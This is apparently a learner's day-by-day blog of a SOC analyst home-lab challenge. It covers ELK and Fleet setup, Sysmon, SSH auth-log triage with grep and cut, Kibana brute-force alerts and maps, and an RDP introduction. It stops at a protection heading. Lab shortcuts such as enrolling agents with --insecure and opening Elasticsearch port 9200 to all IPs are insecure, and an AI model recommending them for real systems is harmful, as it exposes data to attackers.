# My Blog for the 30-Day-MyDFIR-SOC-Analyst-Challenge
## 30 days of SOC skills.

[YouTube playlist](https://www.youtube.com/playlist?list=PLG6KGSNK4PuBb0OjyDIdACZnb8AoNBeq6)

Here is the Syllabus for this challenge
### Week 1
- Introduction to ELK
- How to setup ELK
- Ingesting logs such as Sysmon

### Week 2
- Introduction to brute force attacks
- How to setup SSH and RDP servers
- Create alerts and dashboards

### Week 3
- Introduction to command and control
- How to setup your own C2 server (Mythic)
- Attack our public servers

### Week 4
- Introduction to ticketing system
- How to setup and integrate ticketing system
- Go over how to investigate alerts (high-level)



## Day 1 - Introduction & Diagram

Today I got a look at what the environment will look like for this project and how everything will work together by creating the following logical diagram.

![30Day-MyDFIR-Diagram](https://github.com/user-attachments/assets/e6830c50-2249-4b45-8410-655c7c8d58d6)



## Day 2 - ELK Stack
**Objective:  Better understanding of what the ELK stack is and the benefits.**

This is the core of the project used to collect, filter and view our data with the following three tools.  Elasticsearch, Logstash, and Kibana.

- **E - Elasticsearch** - Our Indexer / Search Head. The haart of the ELK Stack.  This is a database at its core able to store your logs from multiple sources.  This uses a query language called ES|QL   
      (Elasticsearch Query Language).  You can also access data from other apps via Restful APIs or JSON.
- **L - Logstash** - The Heavy Forwarder.  This is the processing pipeline that can ingest your data/telemetry from multiple sources to filter and output it to your Elasticsearch instance.  Two of the most common 
      ways to collect data are using Beats and Elastic Agents (more on this later).
- **K - Kibana** - Web GUI.  This is essentially our dashboard which we'll be using to sort through and view our logs.

With these 3 items we can:
- Search Data
- Create Visulizations
- Create Reports
- Create Alerts

You can find out more about the from the following URL:
[https://www.elastic.co/elastic-stack/features](https://www.elastic.co/elastic-stack/features)



## Day 3 - Create your own Elasticsearch instance 
**Objective:  Learn how to spin up your own Elasticsearch instance.**

I created my Elasticsearch instance in the cloud with MyDFIR's $300 credit through VULTR cloud services.  I was able to setup a Virtual Private Cloud (VPC) that will contain all of the virtual machines.  Next I set up a VM running Ubuntu 22.04 LTS (80GB NVMe storage, 4 vcores, & 16 GB memory) and was able to SSH into it from my host PC.  I copied the link from Elasticsearch's download page (platform DEB x86_64) [https://elastic.co/downloads/elasticsearch](https://elastic.co/downloads/elasticsearch) and installed it on my Ubuntu instance.  Once completed, I configured a firewall all within the initial VPC.  The only real modifications that needed to be done was to update the Ubuntu distro and modify the Elasticsearch YAML file for the proper IP address and port so the SOC Analyst instance will be able to connect to it.



## Day 4 - Kibana Setup
**Objective:  Learn how to install your own Kibana instance.**

From the following URL [https://elastic.co/downloads/kibana](https://elastic.co/downloads/kibana) I copied the link after choosing the platform DEB x86_64. and within the same Ubuntu VM we installed Elastcisearch where we downloaded the Kibana deb file using the following command `wget https://artifacts.elastic.co/downloads/kibana/kibana-8.15.0-amd64.deb`.



## Day 5 - Windows Server 2022 Installation
**Objective:  Have a Windows Server with RDP exposed to the internet.**

While installing the Windows Server 2022 VM Steven made a slight modification to the setup and added the changes to our inital logical diagram.  We're going to leave the Windows server and Ubuntu Server outside the VPC.  This will help protect our Fleet and Ticket Servers from being attacked if there was a potential breach.  This will also provide Windows Event Logs that we can use later on.

![30Day-MyDFIR-Diagram-2.0](https://github.com/user-attachments/assets/0f9e44ec-f12f-4312-9c1b-446080f0c8c5)




## Day 6 - Elastic Agent and Fleet Server Introduction
**Objective:  Learn what a Fleet Server is and the Elastic Agent.**

- **Elastic Agent**: Used to provide a unified way of adding many types of security data such as metrics and logs that can be sent to Logstash or an Elasticsearch environment.  These agents are ran from policies that can be modified to your specifications and tell your end points what logs/data to send to a database and/or a Security Incident Event Manager (SIEM).  These can be installed in two ways:
**Standalone**:  All configurations are applied to the Elastic Agent manually once installed.
**Managed by Fleet**:  Once installed the Elastic Agent configurations are managed from a central point with the Fleet user interface. **This is the method that will be used for this project**

- **Beats**: There are several types of Beats:
File Beat - Logs
Metric Beat - Metrics
Packet Beat - Network Data
Winlog Beat - Windows Events
Audit Beat - Audit Data
Heartbeat Beat - Uptime

Beats and Elastic Agents both have their pros and cons and depends on your objectives.  See the link below for the full comparison between the two:
[Beats & Agent Capabilities](https://www.elastic.co/guide/en/fleet/current/beats-agent-comparison.html#additional-capabilities-beats-and-agent)

**Feet Servers**: A server that allows you to manage multiple agents in a centralized location.  This simplifies the process of modifying or updating policies in just one place.


## Day 7 - Elastic Agent and Fleet Server Setup Tutorial
**Objective:  Install Elastic Agent on Windows Server.  Enroll the Windows Server into a Fleet**

### Fleet Server Installation
I created a new Ubuntu 22.04 LTS VM today to use for our Fleet Server on the VULTR cloud service (In the "Choose Plan" section the first option under "General Purpose" is fine. 1 vCPU, 4 GB Memory, & 60 GB NVMe storage).

In the Elasticsearch GUI we'll begin adding our Fleet Server (Click on the hamburger icon at the top left -> Scroll down to Management -> Select Fleet).  Click on the blue button in the middle of the screen labelled "Add Fleet Server".  The two options presented on the right are "Quick Start" abd "Advanced".  For this lab we're going to use "Quick Start"

I labelled my server the same as the tutorial "MyDFIR-Fleet-Server" and the fleet server VM's IP on VULTR as a URL "https://(MyDFIR-Fleet-Server VM IP)".  And then click on the button below labelled "Generate Fleet Server policy".  It will then provide a multi-line Linux command for our policy which we'll copy right after we log into our Fleet Server VM in the next step.

Once the Fleet Server VM is running we'll log into it using SSH with the VM IP and credendials listed on VULTR. and we'll update the VM `apt update && apt upgrade -y`.

There was some troubleshooting involved in order for the Fleet Server, ELK Server VM, & Windows Server VMs to all communicate with each other by setting some firewall rules on the VULTR firewall as well as some firewall modifications on the ELK Server VM.

### Elastic Agent Installation
Once the Fleet Server Policy is install it should show "Fleet Server Connected" and we can click on the button labelled "Continue enrolling Elastic Agent".  In the next window I'll give our agent policy a name "MyDFIR-Windows-Policy".  I'll leave "Collect system logs and metrics" with a checkmark in it and click on the button on the right that says "Create policy".

The next window will provide you a script.  I'll choose the tab for Windows and copy the policy script.  We'll open up the console for the Windows Server VM and log in.  Open up Powershell as Administrator (Just in case it doesn't have admin rights already) and copy in the policy script.

There are some more troubleshooting steps taken with the network and firewall.  I opened ports 8220 and 443 on the Fleet server VM and made the following modifications to our Agent policy script.  The IP's port 443 was changed to 8220 and at the end we added **--insecure**.

eg.  
".\elastic-agent.exe install --url=https://(fleet server IP):**443** --enrollment-"

The port was changed to 8220
".\elastic-agent.exe install --url=https://(fleet server IP):**8220** --enrollment-"

We also need to change the port in the Fleet section of our Elasticsearch GUI.  (Click on the hamburger icon at the top left -> Scroll down to Management -> Select Fleet -> Select Settings).
In the "Fleet server hosts" section we'll click on the pencil icon on the right and change the port from 443 to 8220 and click on the button "Save and apply settings".

The policy script to add an Elastic Agent in Powershell in the Windows VM should now go through with the message "Elastic Agent has been successfully installed" and will add a new listing to the Fleet Management section of the Elasticsearch GUI.

### Side note results:
I noticed when testing out the alerts that I wasn't able to just search for the end name like Steven does with "stevenrocks".  It only worked for me when typing out the whole name of the Windows Server Host name.  And the event_code listing wasn't showing up in any of my alerts.  I'll have to look into this when more time is available or I may have trouble getting the end results for the challenge.

First week done!  But lots more to do and learn.


## Day 8 - What is Sysmon?
**Objective:  Learn about Sysmon and what it can do.**

Sysmon is a tool that monitors and logs system activity on an endpoint.  It can monitor actions such as:

- Process Creations
- Network Connections
- File Creations
- And so much more

It can be configured using a configuration file (Which is recommended).

[https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)

Exmaples of some comman Event IDs:

**Event ID: 1 - Process Creation**
Sysmon can record the hash of process image files which can be used to perform Open Source Intelligence (OSINT) for further investigation.  The default Hash algorythm is SHA1 but can also use MD5, SHA256, and IMPHASH.  To correlate events it also includes a process Globally Unique Identifier or GUID with process create events.  This is especially helpful when Windows reuses a porcess ID.

**Event ID: 3 - Network Connection**
When it comes to network connections Sysmon can record the following:

- Source IP
- Destination IP
- Ports
- Process

**Note:** This setting is disabled by default.

**File Creations**
**Event ID: 6/7/8 - Driver/Image load & Create Remote Thread**
These are used in detecting defense evasion techniques such as Procsss Injection (a technique where threat actors may inject code into processes).  The downside is they can create a lot of events which can create a lot of false positives.

**Note:**  Event ID: 7 - Image Load is disabled by default.

**Event ID: 10 - Process Access**
This event ID shows up most commonly when attackers are looking to steal credentials by looking into memory for the Local Security Authority or Lsass.exe process.  Pass-the-Hash is an example attack when this event would be present.

**Event ID: 22 - DNSEvent (DNS Query)**
This process is triggered when a DNS is queried.


## Day 9 - Sysmon Setup Tutorial
**Objective:  Install Sysmon onto Windows Server and confirm telemetry.**

Today went installed Sysmon by going to the following link:

Sysmon (v15.15 as of this post)
[https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)

And we're going to use Olaf Hartong's Sysmon configuration file:

[https://raw.githubusercontent.com/olafhartong/sysmon-modular/master/sysmonconfig.xml](https://raw.githubusercontent.com/olafhartong/sysmon-modular/master/sysmonconfig.xml)

Logging into our Windows Server VM we'll open up a Powershell terminal as Administrator.  Here is the usage info for Sysmon64.exe:
```
System Monitor v15.15 - System activity monitor
By Mark Russinovich and Thomas Garnier
Copyright (C) 2014-2024 Microsoft Corporation
Using libxml2. libxml2 is Copyright (C) 1998-2012 Daniel Veillard. All Rights Reserved.
Sysinternals - www.sysinternals.com

Usage:
Install:                 Sysmon64.exe -i [<configfile>]
Update configuration:    Sysmon64.exe -c [<configfile>]
Install event manifest:  Sysmon64.exe -m
Print schema:            Sysmon64.exe -s
Uninstall:               Sysmon64.exe -u [force]`
  -c   Update configuration of an installed Sysmon driver or dump the
      `current configuration if no other argument is provided. Optionally
       `take a configuration file.
  -i   Install service and driver. Optionally take a configuration file.
  -m   Install the event manifest (done on service install as well)).
  -s   Print configuration schema definition of the specified version.
       `Specify 'all' to dump all schema versions (default is latest)).
  -u   Uninstall service and driver. Adding force causes uninstall to proceed
       `even when some components are not installed.
```
The service logs events immediately and the driver installs as a boot-start driver to capture activity from early in the boot
that the service will write to the event log when it starts.

On Vista and higher, events are stored in "Applications and Services Logs/Microsoft/Windows/Sysmon/Operational". On older
systems, events are written to the System event log.

Use the '-? config' command for configuration file documentation. More examples are available on the Sysinternals website.

`Specify -accepteula to automatically accept the EULA on installation, otherwise you will be interactively prompted to accept it.`

`Neither install nor uninstall requires a reboot.`

I executed the follwing command to install: `.\Sysmon64.exe -i sysmonconfig.xml`

If you see the following, congratulations!  Sysmon is installed.
`The operation completed successfully.`

I verified the Sevice is running.

![Sysmon in Services](https://github.com/user-attachments/assets/e7f46212-0a13-472d-8e5a-3fa5322133cb)

And my first event in the Windows Logs (Even Viewer) under Applications and Services Logs -> Microsoft -> Windows -> Sysmon -> Operationsal

![Sysmon Event Viewer](https://github.com/user-attachments/assets/42173729-3bcf-4eea-8762-219582870bc6)

## Day 10 - Elasticsearch Ingest Data Tutorial
**Objective:  Learn how to ingest Sysmon and Windows Defender logs into Elasticsearch.**

Today we added Symon logs and Windows Defender logs (some of them) into our Elasticsearch instance. Once you log into your Elasticsearch instance the home page has the option to "Add Integrations" which we'll select.

![Add_Integrations](https://github.com/user-attachments/assets/a6534d10-7f55-4b61-89aa-f10f53b36be1)

The one we want is "Custom Windows Event Logs" which we can search for and click on "Add Custom Windows Event Logs" at the top right corner.

**Sysmon**
- Step 1: Ror Sysmon we'll call it "MYDFIR-WIN-Sysmon" and a description of "Collect Sysmon Logs".  Everything else we can leave as default.
- Step 2: If we click on "Existing hosts" in the Agent policy drop down we can choose our "MyDFIR-Windows-Policy".  Click "Save and continue" at the bottom right and "Save and deploy changes" on the next window that pops up.

**Windows Defender**
- Step 1: For Windows Defender we'll give it a name of "MDFIR-WIN-Defender" with a description of "Collect Defender Logs".  Since we don't want to collect all Defender logs we'll click on "Advanced Options" and under Event ID we'll add the three IDs we want to monitor.
We'll enter `1116,1117,5001`
- Step 2: is the same as above.  We'll click on "Existing hosts" in the Agent policy drop down we can choose our "MyDFIR-Windows-Policy".  Click "Save and continue" at the bottom right and "Save and deploy changes" on the next window that pops up.

You should have two integration listings showing now.

![Integrations](https://github.com/user-attachments/assets/6839ef10-1789-49dc-b4e7-27cdd3b7e88b)

**Troublwshooting log ingestion**

If your Windows agent in Elastic shows no CPU or memory utilization (In Elastic under Hamburger menu -> Management -> Fleet -> and clicking on your Windows Agent) we'll perform the following stops to troubleshoot:
- We'll restart our Elastic Service in our Windows VM.
- Added a firewall rule in VULTR for TCP under port 9200 for all IPs.


## Day 11 - What is a Brute Force Attack?
**Objective:  Learn more about brute force attacks, common tools and how to protect yourself.**
 
- **Brute Force Attack** - The attempt to try every combination of a password to gain access.  A good example of this is MyDFIR's luggage combination where every combination is attempted.

- **Dictionary Attack** - This attack will normally use a collection of either words, phrases, or passwords to gain access to a person's login.  These collections of passwords are normally found from credential or password dumps obtain from a past data breach from a website or company.  A commonly known list is the rockyou.txt password list.

- **Credential stuffing** - The act in trying multiple username and password combinations in the hopes of gaining access.

**Protection from brute force attacks**

- Use longer passwords or long password phrases. 
- 15+ characters is recommended with a combination of upper and lowercase letters, numbers, and special characters (!@#$%).
- Use a password manager.
- Try using a psss phrase (eg. Please subscribe to MyDFIR)
- Use multifactor authentication (MFA or 2FA).  Can be in the form of Text, Email, Authenticator app (app is recommended)
- Stay vigilente is a different mindset to question all types of emails or texts received for potential phishing or smishing attacks

**Example brute force attack tools**
These common tools can all be found by default in Kali Linux.
- Hydra [https://github.com/vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra)
- Hashcat [https://hashcat.net/hashcat/](https://hashcat.net/hashcat/)
- John the Ripper [https://www.openwall.com/john/](https://www.openwall.com/john/)

You can test brute force attacks out with MyDFIR's following lab if you like:
[Active Directory Project (Home Lab)](https://www.youtube.com/watch?v=5OessbOgyEo&list=PLG6KGSNK4PuBWmX9NykU0wnWamjxdKhDJ&index=13)


## Day 12 - Ubuntu Server 24.02 Installation
**Objective:  Setup SSH Server and view authentication logs.**

Today we got to setup our SSH Server so that we can view the authentication logs for brute force attempts.

In VULTR we did the following steps to deploy our SSH server:
- Click the blue "Deploy+" button at the top right corner.
- Select "Deploy New Server", the first listing in the drop down.
- Choose type is "Cloud Compute - Shared CPU".
- Select your closest location to you (eg New York (NJ)).
- For the image we're going to choose Ubuntu 24.04 LTS x64.
- For "Choose Plan" we'll select the "Regular Cloud Compute" Option (You'll get a pop up to select a higher plan.  Just select "No thanks") and we'll just select the first option (25 GB SSD, 1 vCPU, 1 GB Memory, 1 TB Bandwidth).
- We'll remove all the "Additional Features" (Auto Backups & IPv6).
- Server settings can be left as default
- **Server Hostname & Label** - If you plan on entering the challenge giveaway you must use the folloiwng format "MYDFIR-Linux-<Your_Handle>" (eg. MYDFIR-Linux-Stevenrocks)
- Click on the "Deploy Now" button at the bottom right hand corner.

Once all of this is completed give the VM a few minutes to get up and running.  And, like before, we can log into it using a Windows Powershell or Command Prompt on your host computer (or whichever CLI you use on your host OS).  
We'll run `ssh root@(MYDFIR-Linux-<Your_Handle> VM IP)`, type "yes", and then copy and paste your MYDFIR-Linux-<Your_Handle> VM's password.  Once again, we'll update our Linux VM with the following `apt update && apt upgrade -y`.

**Authentication Logs**

Let's take a look at some authentication logs.  If you move into `cd /var/log` you'll see the following files:

`alternatives.log  auth.log       cloud-init.log         dmesg     image_build_date  kern.log   private  sysstat              watchdog`
`apport.log        bootstrap.log  cloud-init-output.log  dpkg.log  installer         landscape  README   ufw.log              wtmp`
`apt               btmp           dist-upgrade           faillog   journal           lastlog    syslog   unattended-upgrades`

The "auth.log" file is the log that shows all of the authentication logs.  To view the contents we can run:
`cat auth.log`

```
2024-09-12T22:30:50.067914+00:00 MYDFIR-Linux-Cyphodias sshd[13550]: Failed password for invalid user user7 from 201.124.227.239 port 53304 ssh2
2024-09-12T22:30:51.186779+00:00 MYDFIR-Linux-Cyphodias sshd[13550]: Received disconnect from 201.124.227.239 port 53304:11: Bye Bye [preauth]
2024-09-12T22:30:51.186933+00:00 MYDFIR-Linux-Cyphodias sshd[13550]: Disconnected from invalid user user7 201.124.227.239 port 53304 [preauth]
2024-09-12T22:31:26.748799+00:00 MYDFIR-Linux-Cyphodias sshd[13552]: Invalid user admin from 43.128.107.63 port 38984
2024-09-12T22:31:26.752559+00:00 MYDFIR-Linux-Cyphodias sshd[13552]: pam_unix(sshd:auth): check pass; user unknown
2024-09-12T22:31:26.752641+00:00 MYDFIR-Linux-Cyphodias sshd[13552]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=43.128.107.63
2024-09-12T22:31:28.705881+00:00 MYDFIR-Linux-Cyphodias sshd[13552]: Failed password for invalid user admin from 43.128.107.63 port 38984 ssh2
2024-09-12T22:31:30.747633+00:00 MYDFIR-Linux-Cyphodias sshd[13552]: Received disconnect from 43.128.107.63 port 38984:11: Bye Bye [preauth]
2024-09-12T22:31:30.748676+00:00 MYDFIR-Linux-Cyphodias sshd[13552]: Disconnected from invalid user admin 43.128.107.63 port 38984 [preauth]
2024-09-12T22:32:06.641916+00:00 MYDFIR-Linux-Cyphodias sshd[13554]: Invalid user user from 103.213.238.91 port 37078
2024-09-12T22:32:06.646099+00:00 MYDFIR-Linux-Cyphodias sshd[13554]: pam_unix(sshd:auth): check pass; user unknown
2024-09-12T22:32:06.646206+00:00 MYDFIR-Linux-Cyphodias sshd[13554]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=103.213.238.91
2024-09-12T22:32:09.091320+00:00 MYDFIR-Linux-Cyphodias sshd[13554]: Failed password for invalid user user from 103.213.238.91 port 37078 ssh2
2024-09-12T22:32:10.367834+00:00 MYDFIR-Linux-Cyphodias sshd[13554]: Received disconnect from 103.213.238.91 port 37078:11: Bye Bye [preauth]
2024-09-12T22:32:10.368133+00:00 MYDFIR-Linux-Cyphodias sshd[13554]: Disconnected from invalid user user 103.213.238.91 port 37078 [preauth]
---
```

After I waited a few hours we can see some log entries "failed password" and "Disconnected from invalid user" among others.
Let's try to filter some of this out to only show **failed** entries.

Let's run `grep -i failed auth.log`

```
2024-09-12T22:30:50.067914+00:00 MYDFIR-Linux-Cyphodias sshd[13550]: Failed password for invalid user user7 from 201.124.227.239 port 53304 ssh2
2024-09-12T22:31:28.705881+00:00 MYDFIR-Linux-Cyphodias sshd[13552]: Failed password for invalid user admin from 43.128.107.63 port 38984 ssh2
2024-09-12T22:32:09.091320+00:00 MYDFIR-Linux-Cyphodias sshd[13554]: Failed password for invalid user user from 103.213.238.91 port 37078 ssh2
2024-09-12T22:33:53.714178+00:00 MYDFIR-Linux-Cyphodias sshd[13556]: Failed password for invalid user ts3 from 161.35.25.207 port 47530 ssh2
2024-09-12T22:33:57.348871+00:00 MYDFIR-Linux-Cyphodias sshd[13558]: Failed password for invalid user deployer from 27.254.235.12 port 51930 ssh2
2024-09-12T22:34:22.211401+00:00 MYDFIR-Linux-Cyphodias sshd[13561]: Failed password for invalid user oracle from 91.212.166.37 port 48694 ssh2
2024-09-12T22:35:00.304808+00:00 MYDFIR-Linux-Cyphodias sshd[13563]: Failed password for invalid user admin from 157.230.25.246 port 60514 ssh2
2024-09-12T22:37:04.509277+00:00 MYDFIR-Linux-Cyphodias sshd[13569]: Failed password for invalid user admin from 47.113.224.38 port 53114 ssh2
2024-09-12T22:37:28.166191+00:00 MYDFIR-Linux-Cyphodias sshd[13571]: Failed password for ubuntu from 159.203.110.93 port 58938 ssh2
2024-09-12T22:37:37.768494+00:00 MYDFIR-Linux-Cyphodias sshd[13574]: Failed password for invalid user postgres from 161.35.25.207 port 52540 ssh2
2024-09-12T22:37:38.358219+00:00 MYDFIR-Linux-Cyphodias sshd[13576]: Failed password for invalid user odoo13 from 201.124.227.239 port 49726 ssh2
2024-09-12T22:37:41.916931+00:00 MYDFIR-Linux-Cyphodias sshd[13578]: Failed password for invalid user oracle from 157.230.25.246 port 50694 ssh2
2024-09-12T22:37:52.607145+00:00 MYDFIR-Linux-Cyphodias sshd[13580]: Failed password for invalid user ts3server from 91.212.166.37 port 38828 ssh2
2024-09-12T22:38:16.095744+00:00 MYDFIR-Linux-Cyphodias sshd[13582]: Failed password for invalid user ts3server from 161.35.25.207 port 32828 ssh2
2024-09-12T22:38:20.022168+00:00 MYDFIR-Linux-Cyphodias sshd[13584]: Failed password for invalid user testuser from 157.230.25.246 port 48698 ssh2
...
```

Nice!  Let's go one step further and try filtering just for failed attempts with 'root'.

`grep -i failed auth.log | grep -i root`

```
024-09-12T22:38:31.237243+00:00 MYDFIR-Linux-Cyphodias sshd[13588]: Failed password for root from 91.212.166.37 port 33498 ssh2
2024-09-12T22:42:59.902538+00:00 MYDFIR-Linux-Cyphodias sshd[13693]: Failed password for root from 103.213.238.91 port 36116 ssh2
2024-09-12T22:43:15.644910+00:00 MYDFIR-Linux-Cyphodias sshd[13703]: Failed password for root from 157.230.25.246 port 60078 ssh2
2024-09-12T22:43:49.810078+00:00 MYDFIR-Linux-Cyphodias sshd[13713]: Failed password for root from 161.35.25.207 port 43618 ssh2
2024-09-12T22:43:53.704374+00:00 MYDFIR-Linux-Cyphodias sshd[13715]: Failed password for root from 103.213.238.91 port 49182 ssh2
2024-09-12T22:44:01.943616+00:00 MYDFIR-Linux-Cyphodias sshd[13720]: Failed password for root from 27.254.235.12 port 52954 ssh2
2024-09-12T22:44:10.571615+00:00 MYDFIR-Linux-Cyphodias sshd[13722]: Failed password for root from 91.212.166.37 port 54434 ssh2
2024-09-12T22:45:29.373134+00:00 MYDFIR-Linux-Cyphodias sshd[13752]: Failed password for root from 91.212.166.37 port 47660 ssh2
2024-09-12T22:46:25.498704+00:00 MYDFIR-Linux-Cyphodias sshd[13772]: Failed password for root from 157.230.25.246 port 42044 ssh2
2024-09-12T22:47:38.410183+00:00 MYDFIR-Linux-Cyphodias sshd[13800]: Failed password for root from 161.35.25.207 port 52566 ssh2
2024-09-12T22:47:40.868180+00:00 MYDFIR-Linux-Cyphodias sshd[13802]: Failed password for root from 157.230.25.246 port 59266 ssh2
2024-09-12T22:48:52.409692+00:00 MYDFIR-Linux-Cyphodias sshd[13824]: Failed password for root from 161.35.25.207 port 53912 ssh2
2024-09-12T22:49:25.763273+00:00 MYDFIR-Linux-Cyphodias sshd[13838]: Failed password for root from 91.212.166.37 port 33706 ssh2
2024-09-12T22:49:51.923346+00:00 MYDFIR-Linux-Cyphodias sshd[13850]: Failed password for root from 159.203.110.93 port 38230 ssh2
2024-09-12T22:50:58.545098+00:00 MYDFIR-Linux-Cyphodias sshd[13877]: Failed password for root from 201.124.227.239 port 50086 ssh2
---
```

How about if we only wanted the IPs that were used to gain root access?  We can use the 'cut' command for this. The cut command removes sections of lines to show only what your searching for by selecting a specific ccolumn using a delimiter.  So if we used a space between words as our delimiter our command would look something like the following:

`grep -i failed auth.log | grep -i root | cut -d ' ' -f 9`

The -d ' ' tells the cut command to use a blank or space between each section/word,  The -f '9' will cut out the data at the 9th field/column in each line after the delimiter specified previously.

```
91.212.166.37
103.213.238.91
157.230.25.246
161.35.25.207
103.213.238.91
27.254.235.12
91.212.166.37
91.212.166.37
157.230.25.246
161.35.25.207
157.230.25.246
161.35.25.207
91.212.166.37
159.203.110.93
201.124.227.239
---
```

And here is our list of IP addresses that have attempted a brute force attack to try and gain root access.


## Day 13 - How To Install Elastic Agent on Ubuntu
**Objective:  Install Elastic Agent onto Linux Ubuntu Server.**

Just like the last two (fleet server & Windows Server) the first step is to add a policy for our agent.
- Under the hamburger menu we'll open up Fleet under the Management section.
- Within Fleet we'll select "Agent policies" and click on the blue button "Create agent policy" on the right.
- Enter the name of the policy "MyDFIR-Linux-Policy" and click on the blue button "Create agent policy" at the bottom right.

We varified that the path for the policiy is already point to the auth.log file but noticed that it also looks at the /var/log/secure file for other Linux distros like Red Hat & CentOS.

Next we'll add our Elastic Agent.
- Back to the Management section to open up Fleet again.
- Click on the blue "Add Agent" button on the right.
- In the drop down select the "MyDFIR-Linux-Policy" we just created.
- Leave everything else default and copy the Linux Tar commands.
- If you haven't already SSH into your Ubuntu Linus server and we'll paste in our Linux TAR commands and we'll add a space with the following `--insecure` for the unsigned certificate.

Now if we go to Discover in our Elastic instance we should see logs for our Linux server.  We can search for one of the IPs attempting a brute force attack from yesterday's section to view the logs that show up (I'll use 157.230.25.246).

![Elastic IP search](https://github.com/user-attachments/assets/5f694fa8-e4b1-4cff-b6fa-8db2ef8a7c8c)

If I click on one of the entries and scroll down to the message field we can see the following:

![Elastic message field](https://github.com/user-attachments/assets/81c6edcb-4387-49a0-a4b9-f5d53e141556)

When you hover over the message field you get a menu that pops up.  With the second icon (Toggle column in table) we can actually insert this field into the table of alerts for easier searching.

![Elastic field menu](https://github.com/user-attachments/assets/a3c67a57-2ce5-4a09-8074-6b07747e99ac)

This will show the end result in our table alerts.

![Elastic message field alerts](https://github.com/user-attachments/assets/741e70b4-f258-4503-a66a-9379ef217f98)


## Day 14 - How To Create Alerts and Dashboards in Kibana (Part 1)
**Objective:  Create SSH Brute Force Alert & Dashboard**


### Alert Creation

To make a brute force alert in your Elastic instance we want to capture a few things first:  Failed attempts, user, and source ip.  After searching for a bit and the help of the Day 14 tutorial, the fields we want to add to our alart are the following:
- system.auth.ssh.event
- user.name
- source.ip

To add a field as a column you just click on the small circled plus sign symbol to the right when hovering over a field name.  We also added "souce.geo.country_name" as well to show the country origin.  Your data may be different but the format should look like the below image.

![Elastic Discover filtered Failed SSH columns](https://github.com/user-attachments/assets/60dd697f-4d02-4ed8-bc0f-65316a4fd3eb)

We can save this query as an alert by click "Alerts" at the top right corner and selecting "Create search threshold rule".  A new window on the right should appear and we'll give our Alert a name "MyDFIR-SSH Brute Force Activity-(Your handle name)".

The one thing we want to change in here is the "IS ABOVE" field from 1000 to 5 so we can see more alerts more often.  The rest can be left as default and we can click on the blue "Save" button.  If there's no actions you might get another window come up which you can just click on the "Save Rule" button.

### Dashboard Creation

The first thing we'll need is to build our search query string from the alert we just made.

`system.auth.ssh.event : * and agent.name: MYDFIR-Linux-(your handle name) and system.auth.ssh.event: Failed`

You can confirm it works by pasting it in the filter field of the discover section as it should show the same data as your alert.  Once that's confirmed we can move into the maps section (Hamburger menu -> Analytics -> Maps) and paste our query string into the search field at the top.  Next we'll select the blue "Add layer" button on the right.

![Elastic Maps Add Layer Menu](https://github.com/user-attachments/assets/3c953f60-d974-4c13-bdd5-dc7e35107c67)

There are a lot of options but the one we want is "Choropleth" which will shade the locations that attempted a Brute Force atack.

The next section we'll leave the Boundary Source as "Administrative boundaries from the Elastic Maps Service".  In the EMS boundaries we'll select "World Countries" and under Statistics source for the "Data view" we'll pick the ".alerts-security.alerts..." option which should be the same data view we're using in the Discover section and verify with the blue drop down underneath the Hamburger menu.

![Elastic Dicover Data view](https://github.com/user-attachments/assets/f2e5a1b8-6736-42f8-8e72-a5afb7c703c1)

And for the "Join field" we'll choose `source.geo.country.iso.code`.  Click on the blue "Add and continue" button at the bottome right.  The rest of the settings can be left as default and we can click on the blue "Save" button at the top right corner.

We'll give our Map a title like "SSH Failed Authentications" and to add this to a dashboard we'll select the "New" option and select the blue "Save and go to Dashboard" button.

Finally to save the dashboard we select the blue "Save" button at the top right corner and in the new window we'll name it "MyDFIR-Authenticaiton-Activity" and clck on the blue "Save" button within that window and we should see the below map with various countries colored in.

![SSH Failed Authentications Map](https://github.com/user-attachments/assets/55bc33c8-4b70-4a27-a5e1-8511fc264f52)

We can even map a successful authentication map by clicking on the 3 dots at the top right corner of your map and selecting duplicate.  And we'll give the new map a title such as "SSH Successful Authentications".  We'll need to modify our query to only look at successful attempts so we'll click on the 'Edit" link in the Query section below.

A new map window should show up with our Failed query string we used in the first map.  By modifiying the query in the discover section we found the key word for a successful attempt is labelled "Accepted" so we'll replace "Failed" at the end of our string to "Accepted".  To confirm it works you can change the timefrme to the last 90 days and you should see at least one shaded in option from your country.  Once you confirm you can click on the blue "Save and return" button at the top right corner.

You can set your timeframe to your liking but as per the tutorial I'll select "Last 15 minutes" and click on the blue "Save" button at the top right corner.  You should now have a dashboard showing world maps of failed and successful SSH brute force attempts by country!

![Elastic dashboard duel map](https://github.com/user-attachments/assets/eae407e6-606c-47d5-bf23-22500d2d10ce)


## Day 15 - Remote Desktop Protocol Introduction
**Objective:  Learn about RDP, why it is used, how attackers abuse it, how to find endpoints with exposed RDP and how you can pretect yourself.**

**RDP (Remote Desktop Protocal** - "used for communication between the Terminal Server and the Terminal Server Client. RDP is encapsulated and encrypted within TCP."

Original KB number:   186607

[https://learn.microsoft.com/en-us/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol](https://learn.microsoft.com/en-us/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol)

Default Port:  3389 with TCP

### Why it's used
Unlike SSH RDP allows you to connect via a Graphical User Interface (GUI) as if you were using your own Windows environment locally.  It saves time, easily accessible, and conveinient.

### How does it get abused?
Attackers can perform scans on IP ranges for this port to find if RDP's port is open or not and then attempt a brute force attack to gain access for malicious activites such as data exfiltraion, ransomeware or both.

### How to find exposed RDP Server
****DISCLAIMER** - For the following sites **DO NOT** try to brute force any of these unless you have explicit consent from the owner.  This is for educational purposes only.

**Shodan** - [https://www.shodan.io/](https://www.shodan.io/)

****Note** - This site requires a valid login for many of it's features.

Shodan allows us to search for `port: 3389` in the search field at the top and will show us just how many open RDP ports there are by country.

![Shodan port 3389 search results](https://github.com/user-attachments/assets/0764ddd5-8346-4e7e-9ddb-21492e2ae486)

**Censys** - [https://search.censys.io/](https://search.censys.io/)

Going straight to the search page we can just type in `3389` in the search field and view the amount of open ports open here as well.

![censys search results for port 3389](https://github.com/user-attachments/assets/fb851b18-4387-422d-9f30-82361fa49cbf)

### How to protect yourself
